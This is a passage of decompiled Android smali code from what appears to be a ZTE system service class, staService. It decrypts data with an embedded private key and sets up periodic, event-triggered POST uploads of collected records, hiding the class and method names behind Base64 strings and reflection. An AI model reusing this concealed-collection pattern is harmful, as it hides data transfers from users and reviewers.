    invoke-virtual {v12, v10}, Ljava/security/cert/CertificateFactory;->generateCertificate(Ljava/io/InputStream;)Ljava/security/cert/Certificate;

    move-result-object v11

    .line 404
    .local v11, cert:Ljava/security/cert/Certificate;
    invoke-virtual {v11}, Ljava/security/cert/Certificate;->getPublicKey()Ljava/security/PublicKey;

    move-result-object v2

    invoke-interface {v2}, Ljava/security/PublicKey;->getEncoded()[B
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    move-result-object v13

    .line 410
    .end local v10           #bais:Ljava/io/ByteArrayInputStream;
    .end local v11           #cert:Ljava/security/cert/Certificate;
    .end local v12           #certFactory:Ljava/security/cert/CertificateFactory;
    .end local v22           #s:Landroid/content/pm/Signature;
    :cond_3
    :goto_2
    if-nez v13, :cond_4

    .line 411
    const/4 v2, 0x0

    goto :goto_1

    .line 415
    :cond_4
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/zte/heartyservice/main/staService;->k3:Ljava/security/Key;

    if-nez v2, :cond_5

    .line 418
    :try_start_2
    const-string v2, "RSA"

    invoke-static {v2}, Ljava/security/KeyFactory;->getInstance(Ljava/lang/String;)Ljava/security/KeyFactory;

    move-result-object v18

    .line 419
    .local v18, keyFactory:Ljava/security/KeyFactory;
    new-instance v20, Ljava/security/spec/PKCS8EncodedKeySpec;

    sget-object v2, Lcom/zte/heartyservice/main/staService;->encodedKey:[B

    move-object/from16 v0, v20

    invoke-direct {v0, v2}, Ljava/security/spec/PKCS8EncodedKeySpec;-><init>([B)V

    .line 420
    .local v20, priPKCS8:Ljava/security/spec/PKCS8EncodedKeySpec;
    move-object/from16 v0, v18

    move-object/from16 v1, v20

    invoke-virtual {v0, v1}, Ljava/security/KeyFactory;->generatePrivate(Ljava/security/spec/KeySpec;)Ljava/security/PrivateKey;

    move-result-object v2

    move-object/from16 v0, p0

    iput-object v2, v0, Lcom/zte/heartyservice/main/staService;->k3:Ljava/security/Key;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 425
    .end local v18           #keyFactory:Ljava/security/KeyFactory;
    .end local v20           #priPKCS8:Ljava/security/spec/PKCS8EncodedKeySpec;
    :goto_3
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/zte/heartyservice/main/staService;->k3:Ljava/security/Key;

    if-nez v2, :cond_5

    .line 426
    const/4 v2, 0x0

    goto :goto_1

    .line 431
    :cond_5
    const/4 v2, 0x0

    invoke-interface {v8, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v3, v0, Lcom/zte/heartyservice/main/staService;->k3:Ljava/security/Key;

    invoke-static {v2, v3}, Lcom/zte/heartyservice/main/staService;->j(Ljava/lang/String;Ljava/security/Key;)[B

    move-result-object v17

    .line 433
    .local v17, k4:[B
    if-nez v17, :cond_6

    .line 434
    const/4 v2, 0x0

    goto :goto_1

    .line 437
    :cond_6
    const/16 v2, 0x10

    new-array v0, v2, [B

    move-object/from16 v16, v0

    .line 439
    .local v16, k:[B
    move-object/from16 v0, v17

    array-length v2, v0

    add-int/lit8 v2, v2, -0x10

    const/4 v3, 0x0

    const/16 v4, 0x10

    move-object/from16 v0, v17

    move-object/from16 v1, v16

    invoke-static {v0, v2, v1, v3, v4}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    .line 441
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const/4 v3, 0x2

    invoke-static {v13, v3}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 443
    .local v9, authKey:Ljava/lang/String;
    invoke-interface {v8}, Ljava/util/List;->size()I

    move-result v23

    .line 445
    .local v23, size:I
    const/4 v14, 0x1

    .local v14, i:I
    :goto_4
    move/from16 v0, v23

    if-ge v14, v0, :cond_7

    .line 446
    invoke-interface {v8, v14}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    move-object/from16 v0, v16

    invoke-static {v2, v0}, Lcom/zte/heartyservice/main/staService;->k(Ljava/lang/String;[B)Ljava/lang/String;

    move-result-object v19

    .line 447
    .local v19, localkey:Ljava/lang/String;
    move-object/from16 v0, v19

    invoke-virtual {v9, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_8

    .line 448
    const/16 v21, 0x1

    .end local v19           #localkey:Ljava/lang/String;
    :cond_7
    move/from16 v2, v21

    .line 453
    goto/16 :goto_1

    .line 445
    .restart local v19       #localkey:Ljava/lang/String;
    :cond_8
    add-int/lit8 v14, v14, 0x1

    goto :goto_4

    .line 421
    .end local v9           #authKey:Ljava/lang/String;
    .end local v14           #i:I
    .end local v16           #k:[B
    .end local v17           #k4:[B
    .end local v19           #localkey:Ljava/lang/String;
    .end local v23           #size:I
    :catch_0
    move-exception v2

    goto :goto_3

    .line 406
    :catch_1
    move-exception v2

    goto/16 :goto_2

    .line 385
    :catch_2
    move-exception v2

    goto/16 :goto_0
.end method

.method public static j(Ljava/lang/String;Ljava/security/Key;)[B
    .locals 2
    .parameter "str"
    .parameter "key"

    .prologue
    .line 459
    :try_start_0
    const-string v1, "RSA/ECB/NoPadding"

    invoke-static {v1}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v0

    .line 460
    .local v0, cip:Ljavax/crypto/Cipher;
    const/4 v1, 0x2

    invoke-virtual {v0, v1, p1}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V

    .line 461
    const/4 v1, 0x2

    invoke-static {p0, v1}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljavax/crypto/Cipher;->doFinal([B)[B
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v1

    .line 465
    .end local v0           #cip:Ljavax/crypto/Cipher;
    :goto_0
    return-object v1

    .line 462
    :catch_0
    move-exception v1

    .line 465
    const/4 v1, 0x0

    goto :goto_0
.end method

.method public static k(Ljava/lang/String;[B)Ljava/lang/String;
    .locals 5
    .parameter "str"
    .parameter "keyData"

    .prologue
    .line 475
    :try_start_0
    const-string v3, "AES/CBC/PKCS5Padding"

    invoke-static {v3}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v0

    .line 476
    .local v0, cip:Ljavax/crypto/Cipher;
    new-instance v1, Ljavax/crypto/spec/IvParameterSpec;

    sget-object v3, Lcom/zte/heartyservice/main/staService;->IV:[B

    invoke-direct {v1, v3}, Ljavax/crypto/spec/IvParameterSpec;-><init>([B)V

    .line 477
    .local v1, iv:Ljavax/crypto/spec/IvParameterSpec;
    new-instance v2, Ljavax/crypto/spec/SecretKeySpec;

    const-string v3, "AES"

    invoke-direct {v2, p1, v3}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    .line 478
    .local v2, keySpec:Ljavax/crypto/spec/SecretKeySpec;
    const/4 v3, 0x2

    invoke-virtual {v0, v3, v2, v1}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V

    .line 479
    new-instance v3, Ljava/lang/String;

    const/4 v4, 0x2

    invoke-static {p0, v4}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v4

    invoke-virtual {v0, v4}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/String;-><init>([B)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 483
    .end local v0           #cip:Ljavax/crypto/Cipher;
    .end local v1           #iv:Ljavax/crypto/spec/IvParameterSpec;
    .end local v2           #keySpec:Ljavax/crypto/spec/SecretKeySpec;
    :goto_0
    return-object v3

    .line 480
    :catch_0
    move-exception v3

    .line 483
    const/4 v3, 0x0

    goto :goto_0
.end method

.method private l(Landroid/content/Context;)Z
    .locals 7
    .parameter "context"

    .prologue
    .line 488
    const/4 v6, 0x0

    .line 491
    .local v6, ret:Z
    :try_start_0
    new-instance v1, Ljava/lang/String;

    const-string v0, "Y29tLnp0ZS5ocy5zdGEuU3Rh"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    const/4 v2, 0x2

    invoke-static {v0, v2}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v0

    invoke-direct {v1, v0}, Ljava/lang/String;-><init>([B)V

    const/4 v2, 0x0

    new-instance v3, Ljava/lang/String;

    const-string v0, "ZG9TdGE="

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    const/4 v4, 0x2

    invoke-static {v0, v4}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v0

    invoke-direct {v3, v0}, Ljava/lang/String;-><init>([B)V

    const/4 v0, 0x1

    new-array v4, v0, [Ljava/lang/Object;

    const/4 v0, 0x0

    aput-object p1, v4, v0

    const/4 v5, 0x0

    move-object v0, p1

    invoke-static/range {v0 .. v5}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->Load(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;[Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v6

    .line 495
    :goto_0
    return v6

    .line 492
    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method private m(Landroid/content/Context;Ljava/util/List;)V
    .locals 6
    .parameter "context"
    .parameter "list"

    .prologue
    .line 502
    :try_start_0
    new-instance v1, Ljava/lang/String;

    const-string v0, "Y29tLnp0ZS5ocy5zdGEuU3Rh"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    const/4 v2, 0x2

    invoke-static {v0, v2}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v0

    invoke-direct {v1, v0}, Ljava/lang/String;-><init>([B)V

    const/4 v2, 0x0

    new-instance v3, Ljava/lang/String;

    const-string v0, "ZG9GaW5pc2g="

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    const/4 v4, 0x2

    invoke-static {v0, v4}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v0

    invoke-direct {v3, v0}, Ljava/lang/String;-><init>([B)V

    const/4 v0, 0x2

    new-array v4, v0, [Ljava/lang/Object;

    const/4 v0, 0x0

    aput-object p1, v4, v0

    const/4 v0, 0x1

    aput-object p2, v4, v0

    const/4 v5, 0x0

    move-object v0, p1

    invoke-static/range {v0 .. v5}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->Load(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;[Ljava/lang/Class;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 506
    :goto_0
    return-void

    .line 503
    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method private n(Landroid/content/Context;)Ljava/util/List;
    .locals 8
    .parameter "context"

    .prologue
    .line 510
    const/4 v7, 0x0

    .line 513
    .local v7, ret:Ljava/util/List;
    :try_start_0
    new-instance v2, Ljava/lang/String;

    const-string v1, "Y29tLnp0ZS5ocy5zdGEuU3Rh"

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    const/4 v3, 0x2

    invoke-static {v1, v3}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v1

    invoke-direct {v2, v1}, Ljava/lang/String;-><init>([B)V

    const/4 v3, 0x0

    new-instance v4, Ljava/lang/String;

    const-string v1, "Z2V0QWxsUmVjb3Jkcw=="

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    const/4 v5, 0x2

    invoke-static {v1, v5}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v1

    invoke-direct {v4, v1}, Ljava/lang/String;-><init>([B)V

    const/4 v1, 0x1

    new-array v5, v1, [Ljava/lang/Object;

    const/4 v1, 0x0

    aput-object p1, v5, v1

    const/4 v6, 0x0

    move-object v1, p1

    invoke-static/range {v1 .. v6}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->Load(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;[Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v1

    move-object v0, v1

    check-cast v0, Ljava/util/List;

    move-object v7, v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 517
    :goto_0
    return-object v7

    .line 514
    :catch_0
    move-exception v1

    goto :goto_0
.end method

.method private o()V
    .locals 4

    .prologue
    .line 523
    new-instance v0, Landroid/content/IntentFilter;

    const-string v2, "android.net.conn.CONNECTIVITY_CHANGE"

    invoke-direct {v0, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 524
    .local v0, intentFilter:Landroid/content/IntentFilter;
    const-string v2, "android.intent.action.TIME_TICK"

    invoke-virtual {v0, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 525
    const-string v2, "android.intent.action.TIME_SET"

    invoke-virtual {v0, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 526
    sget-object v2, Lcom/zte/heartyservice/main/staService;->AST:Ljava/lang/String;

    invoke-virtual {v0, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 527
    iget-object v2, p0, Lcom/zte/heartyservice/main/staService;->sContext:Landroid/content/Context;

    iget-object v3, p0, Lcom/zte/heartyservice/main/staService;->mReceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {v2, v3, v0}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 528
    new-instance v1, Landroid/content/IntentFilter;

    const-string v2, "android.intent.action.PACKAGE_ADDED"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 529
    .local v1, intentFilter2:Landroid/content/IntentFilter;
    const-string v2, "package"

    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->addDataScheme(Ljava/lang/String;)V

    .line 530
    iget-object v2, p0, Lcom/zte/heartyservice/main/staService;->sContext:Landroid/content/Context;

    iget-object v3, p0, Lcom/zte/heartyservice/main/staService;->mReceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {v2, v3, v1}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 531
    return-void
.end method

.method private p()V
    .locals 2

    .prologue
    .line 535
    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->sContext:Landroid/content/Context;

    iget-object v1, p0, Lcom/zte/heartyservice/main/staService;->mReceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {v0, v1}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 536
    return-void
.end method

.method private q()V
    .locals 7

    .prologue
    .line 575
    const-wide/32 v4, 0x36ee80

    .line 576
    .local v4, aa:J
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v0

    add-long v2, v0, v4

    .line 577
    .local v2, bb:J
    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->alarm:Landroid/app/AlarmManager;

    sget-object v1, Lcom/zte/heartyservice/main/staService;->pIntent:Landroid/app/PendingIntent;

    invoke-virtual {v0, v1}, Landroid/app/AlarmManager;->cancel(Landroid/app/PendingIntent;)V

    .line 578
    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->alarm:Landroid/app/AlarmManager;

    const/4 v1, 0x3

    sget-object v6, Lcom/zte/heartyservice/main/staService;->pIntent:Landroid/app/PendingIntent;

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    .line 579
    return-void
.end method

.method private r(Landroid/content/Context;)Z
    .locals 35
    .parameter "context"
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 583
    const/16 v26, 0x0

    .line 586
    .local v26, ret:Z
    :try_start_0
    invoke-direct/range {p0 .. p1}, Lcom/zte/heartyservice/main/staService;->h(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    .line 587
    .local v5, aa:Ljava/lang/String;
    if-nez v5, :cond_1

    .line 588
    invoke-direct/range {p0 .. p1}, Lcom/zte/heartyservice/main/staService;->l(Landroid/content/Context;)Z

    move-result v26

    .line 669
    .end local v5           #aa:Ljava/lang/String;
    :cond_0
    :goto_0
    return v26

    .line 591
    .restart local v5       #aa:Ljava/lang/String;
    :cond_1
    invoke-direct/range {p0 .. p1}, Lcom/zte/heartyservice/main/staService;->f(Landroid/content/Context;)Ljava/util/HashMap;

    move-result-object v7

    .line 593
    .local v7, bb:Ljava/util/HashMap;,"Ljava/util/HashMap<Ljava/lang/String;Ljava/lang/String;>;"
    new-instance v29, Ljava/lang/String;

    const-string v30, "amF2YS5uZXQuVVJM"

    invoke-virtual/range {v30 .. v30}, Ljava/lang/String;->getBytes()[B

    move-result-object v30

    const/16 v31, 0x2

    invoke-static/range {v30 .. v31}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v30

    invoke-direct/range {v29 .. v30}, Ljava/lang/String;-><init>([B)V

    invoke-static/range {v29 .. v29}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v10

    .line 594
    .local v10, clazz:Ljava/lang/Class;,"Ljava/lang/Class<*>;"
    const/16 v29, 0x1

    move/from16 v0, v29

    new-array v6, v0, [Ljava/lang/Class;

    const/16 v29, 0x0

    const-class v30, Ljava/lang/String;

    aput-object v30, v6, v29

    .line 595
    .local v6, argTypes:[Ljava/lang/Class;,"[Ljava/lang/Class<*>;"
    invoke-virtual {v10, v6}, Ljava/lang/Class;->getConstructor([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;

    move-result-object v11

    .line 596
    .local v11, constructor:Ljava/lang/reflect/Constructor;,"Ljava/lang/reflect/Constructor<*>;"
    const/16 v29, 0x1

    move/from16 v0, v29

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v29, v0

    const/16 v30, 0x0

    new-instance v31, Ljava/lang/String;

    invoke-virtual {v5}, Ljava/lang/String;->getBytes()[B

    move-result-object v32

    const/16 v33, 0x2

    invoke-static/range {v32 .. v33}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v32

    invoke-direct/range {v31 .. v32}, Ljava/lang/String;-><init>([B)V

    aput-object v31, v29, v30

    move-object/from16 v0, v29

    invoke-virtual {v11, v0}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v27

    .line 599
    .local v27, u:Ljava/lang/Object;
    new-instance v29, Ljava/lang/String;

    const-string v30, "b3BlbkNvbm5lY3Rpb24="

    invoke-virtual/range {v30 .. v30}, Ljava/lang/String;->getBytes()[B

    move-result-object v30

    const/16 v31, 0x2

    invoke-static/range {v30 .. v31}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v30

    invoke-direct/range {v29 .. v30}, Ljava/lang/String;-><init>([B)V

    const/16 v30, 0x0

    move-object/from16 v0, v27

    move-object/from16 v1, v29

    move-object/from16 v2, v30

    invoke-static {v0, v1, v2}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v16

    .line 601
    .local v16, ff:Ljava/lang/Object;
    new-instance v29, Ljava/lang/String;

    const-string v30, "c2V0Q29ubmVjdFRpbWVvdXQ="

    invoke-virtual/range {v30 .. v30}, Ljava/lang/String;->getBytes()[B

    move-result-object v30

    const/16 v31, 0x2

    invoke-static/range {v30 .. v31}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v30

    invoke-direct/range {v29 .. v30}, Ljava/lang/String;-><init>([B)V

    const/16 v30, 0x1

    move/from16 v0, v30

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v30, v0

    const/16 v31, 0x0

    const/16 v32, 0x7530

    invoke-static/range {v32 .. v32}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v32

    aput-object v32, v30, v31

    move-object/from16 v0, v16

    move-object/from16 v1, v29

    move-object/from16 v2, v30

    invoke-static {v0, v1, v2}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 603
    new-instance v29, Ljava/lang/String;

    const-string v30, "c2V0UmVhZFRpbWVvdXQ="

    invoke-virtual/range {v30 .. v30}, Ljava/lang/String;->getBytes()[B

    move-result-object v30

    const/16 v31, 0x2

    invoke-static/range {v30 .. v31}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v30

    invoke-direct/range {v29 .. v30}, Ljava/lang/String;-><init>([B)V

    const/16 v30, 0x1

    move/from16 v0, v30

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v30, v0

    const/16 v31, 0x0

    const/16 v32, 0x2710

    invoke-static/range {v32 .. v32}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v32

    aput-object v32, v30, v31

    move-object/from16 v0, v16

    move-object/from16 v1, v29

    move-object/from16 v2, v30

    invoke-static {v0, v1, v2}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 605
    new-instance v29, Ljava/lang/String;

    const-string v30, "c2V0RG9PdXRwdXQ="

    invoke-virtual/range {v30 .. v30}, Ljava/lang/String;->getBytes()[B

    move-result-object v30

    const/16 v31, 0x2

    invoke-static/range {v30 .. v31}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v30

    invoke-direct/range {v29 .. v30}, Ljava/lang/String;-><init>([B)V

    const/16 v30, 0x1

    move/from16 v0, v30

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v30, v0

    const/16 v31, 0x0

    const/16 v32, 0x1

    invoke-static/range {v32 .. v32}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v32

    aput-object v32, v30, v31

    move-object/from16 v0, v16

    move-object/from16 v1, v29

    move-object/from16 v2, v30

    invoke-static {v0, v1, v2}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 607
    new-instance v29, Ljava/lang/String;

    const-string v30, "c2V0RG9JbnB1dA=="

    invoke-virtual/range {v30 .. v30}, Ljava/lang/String;->getBytes()[B

    move-result-object v30

    const/16 v31, 0x2

    invoke-static/range {v30 .. v31}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v30

    invoke-direct/range {v29 .. v30}, Ljava/lang/String;-><init>([B)V

    const/16 v30, 0x1

    move/from16 v0, v30

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v30, v0

    const/16 v31, 0x0

    const/16 v32, 0x0

    invoke-static/range {v32 .. v32}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v32

    aput-object v32, v30, v31

    move-object/from16 v0, v16

    move-object/from16 v1, v29

    move-object/from16 v2, v30

    invoke-static {v0, v1, v2}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 609
    new-instance v29, Ljava/lang/String;

    const-string v30, "c2V0VXNlQ2FjaGVz"

    invoke-virtual/range {v30 .. v30}, Ljava/lang/String;->getBytes()[B

    move-result-object v30

    const/16 v31, 0x2

    invoke-static/range {v30 .. v31}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v30

    invoke-direct/range {v29 .. v30}, Ljava/lang/String;-><init>([B)V

    const/16 v30, 0x1

    move/from16 v0, v30

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v30, v0

    const/16 v31, 0x0

    const/16 v32, 0x0

    invoke-static/range {v32 .. v32}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v32

    aput-object v32, v30, v31

    move-object/from16 v0, v16

    move-object/from16 v1, v29

    move-object/from16 v2, v30

    invoke-static {v0, v1, v2}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 611
    new-instance v29, Ljava/lang/String;

    const-string v30, "c2V0UmVxdWVzdE1ldGhvZA=="

    invoke-virtual/range {v30 .. v30}, Ljava/lang/String;->getBytes()[B

    move-result-object v30

    const/16 v31, 0x2

    invoke-static/range {v30 .. v31}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v30

    invoke-direct/range {v29 .. v30}, Ljava/lang/String;-><init>([B)V

    const/16 v30, 0x1

    move/from16 v0, v30

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v30, v0

    const/16 v31, 0x0

    new-instance v32, Ljava/lang/String;

    const-string v33, "UE9TVA=="

    invoke-virtual/range {v33 .. v33}, Ljava/lang/String;->getBytes()[B

    move-result-object v33

    const/16 v34, 0x2

    invoke-static/range {v33 .. v34}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v33

    invoke-direct/range {v32 .. v33}, Ljava/lang/String;-><init>([B)V

    aput-object v32, v30, v31

    move-object/from16 v0, v16

    move-object/from16 v1, v29

    move-object/from16 v2, v30

    invoke-static {v0, v1, v2}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 613
    new-instance v29, Ljava/lang/String;

    const-string v30, "c2V0UmVxdWVzdFByb3BlcnR5"

    invoke-virtual/range {v30 .. v30}, Ljava/lang/String;->getBytes()[B

    move-result-object v30

    const/16 v31, 0x2

    invoke-static/range {v30 .. v31}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v30

    invoke-direct/range {v29 .. v30}, Ljava/lang/String;-><init>([B)V

    const/16 v30, 0x2

    move/from16 v0, v30

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v30, v0

    const/16 v31, 0x0

    new-instance v32, Ljava/lang/String;

    const-string v33, "Y29udGVudC10eXBl"

    invoke-virtual/range {v33 .. v33}, Ljava/lang/String;->getBytes()[B

    move-result-object v33

    const/16 v34, 0x2

    invoke-static/range {v33 .. v34}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v33

    invoke-direct/range {v32 .. v33}, Ljava/lang/String;-><init>([B)V

    aput-object v32, v30, v31

    const/16 v31, 0x1

    new-instance v32, Ljava/lang/String;

    const-string v33, "YXBwbGljYXRpb24vb2N0ZXQtc3RyZWFt"

    invoke-virtual/range {v33 .. v33}, Ljava/lang/String;->getBytes()[B

    move-result-object v33

    const/16 v34, 0x2

    invoke-static/range {v33 .. v34}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v33

    invoke-direct/range {v32 .. v33}, Ljava/lang/String;-><init>([B)V

    aput-object v32, v30, v31

    move-object/from16 v0, v16

    move-object/from16 v1, v29

    move-object/from16 v2, v30

    invoke-static {v0, v1, v2}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 615
    invoke-direct/range {p0 .. p0}, Lcom/zte/heartyservice/main/staService;->t()[B

    move-result-object v21

    .line 616
    .local v21, k4:[B
    const/16 v29, 0x10

    move/from16 v0, v29

    new-array v0, v0, [B

    move-object/from16 v18, v0

    .line 617
    .local v18, k:[B
    const/16 v29, 0x0

    const/16 v30, 0x0

    const/16 v31, 0x10

    move-object/from16 v0, v21

    move/from16 v1, v29

    move-object/from16 v2, v18

    move/from16 v3, v30

    move/from16 v4, v31

    invoke-static {v0, v1, v2, v3, v4}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    .line 619
    const/16 v29, 0xa2

    move/from16 v0, v29

    new-array v14, v0, [B

    fill-array-data v14, :array_0

    .line 620
    .local v14, encodedKey:[B
    const/16 v19, 0x0

    .line 621
    .local v19, k2:Ljava/security/Key;
    const-string v29, "RSA"

    invoke-static/range {v29 .. v29}, Ljava/security/KeyFactory;->getInstance(Ljava/lang/String;)Ljava/security/KeyFactory;

    move-result-object v23

    .line 622
    .local v23, keyFactory:Ljava/security/KeyFactory;
    new-instance v8, Ljava/security/spec/X509EncodedKeySpec;

    invoke-direct {v8, v14}, Ljava/security/spec/X509EncodedKeySpec;-><init>([B)V

    .line 623
